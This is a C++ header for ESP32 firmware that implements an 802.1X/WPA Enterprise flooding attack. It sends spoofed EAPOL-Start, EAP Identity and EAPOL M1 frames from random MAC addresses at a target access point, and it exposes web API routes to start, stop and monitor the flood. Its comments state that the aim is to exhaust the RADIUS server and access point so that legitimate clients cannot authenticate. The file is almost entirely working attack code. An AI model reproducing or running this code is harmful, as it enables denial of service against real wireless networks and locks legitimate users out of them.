#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"
#include "safety.h"

// WPA Enterprise (802.1X) state machine exhaustion.
// Sends EAPOL-Start + EAP Identity Response from random MACs.
// Floods the RADIUS server / AP state machine, preventing legitimate auth.
// Also supports EAP-M1 flood to confuse PEAP/TTLS/EAP-TLS sequences.
static bool eap_running = false;
static uint8_t eap_bssid[6] = {};
static uint8_t eap_ch = 6;
static uint8_t eap_mode = 0;  // 0=eapol-start, 1=eap-identity, 2=M1 flood, 3=all
static volatile uint32_t eap_sent = 0;
static TaskHandle_t eap_task = nullptr;

static void eap_run(void *) {
  uint8_t f[128];
  uint8_t sta[6];
  eap_sent = 0;
  while (eap_running) {
    if (!safety_rate_ok(1)) {
      vTaskDelay(pdMS_TO_TICKS(50));
      continue;
    }
    for (int k = 0; k < 6; k++)
      sta[k] = esp_random() & 0xFF;
    sta[0] = (sta[0] & 0xFE) | 0x02;
    size_t n = 0;
    switch (eap_mode) {
      case 0:
        n = f_eapolStart(f, sta, eap_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        eap_sent++;
        break;
      case 1:
        n = f_eapIdentity(f, sta, eap_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        eap_sent++;
        break;
      case 2:
        n = f_eapolM1(f, sta, eap_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        eap_sent++;
        break;
      default:
        n = f_eapolStart(f, sta, eap_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        eap_sent++;
        n = f_eapIdentity(f, sta, eap_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        eap_sent++;
        n = f_eapolM1(f, sta, eap_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        eap_sent++;
        break;
    }
    vTaskDelay(pdMS_TO_TICKS(5));
  }
  eap_task = nullptr;
  vTaskDelete(nullptr);
}

static bool eap_start(const String &q) {
  int i;
  String bs, ch, mo;
  if ((i = q.indexOf("bssid=")) >= 0) {
    int e = q.indexOf('&', i);
    bs = q.substring(i + 6, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("ch=")) >= 0) {
    int e = q.indexOf('&', i);
    ch = q.substring(i + 3, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("mode=")) >= 0) {
    int e = q.indexOf('&', i);
    mo = q.substring(i + 5, e < 0 ? q.length() : e);
  }
  if (bs.length() != 17)
    return false;
  sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x", (unsigned *)&eap_bssid[0], (unsigned *)&eap_bssid[1],
         (unsigned *)&eap_bssid[2], (unsigned *)&eap_bssid[3], (unsigned *)&eap_bssid[4],
         (unsigned *)&eap_bssid[5]);
  eap_ch = ch.toInt();
  if (!eap_ch)
    eap_ch = 6;
  if (mo == "identity")
    eap_mode = 1;
  else if (mo == "m1")
    eap_mode = 2;
  else if (mo == "all")
    eap_mode = 3;
  else
    eap_mode = 0;
  esp_wifi_set_channel(eap_ch, WIFI_SECOND_CHAN_NONE);
  eap_running = true;
  xTaskCreate(eap_run, "eap_run", 4096, nullptr, 5, &eap_task);
  return true;
}
static void eap_stop() {
  eap_running = false;
}
static void eap_routes() {
  extern WebServer server;
  server.on("/api/eapflood/start", HTTP_POST, []() {
    String q;
    for (int i = 0; i < server.args(); i++) {
      if (i)
        q += '&';
      q += server.argName(i) + '=' + server.arg(i);
    }
    bool ok = tool_start("eapflood", q);
    server.send(200, "application/json", ok ? "{\"ok\":1}" : "{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/eapflood/stop", HTTP_POST, []() {
    tool_stop("eapflood");
    server.send(200, "application/json", "{\"ok\":1}");
  });
  server.on("/api/eapflood/status", HTTP_GET, []() {
    server.send(200, "application/json",
                "{\"running\":" + String(eap_running ? 1 : 0) + ",\"sent\":" + String(eap_sent) +
                    ",\"msg\":\"" + String(eap_sent) + " EAP frames sent\"}");
  });
}
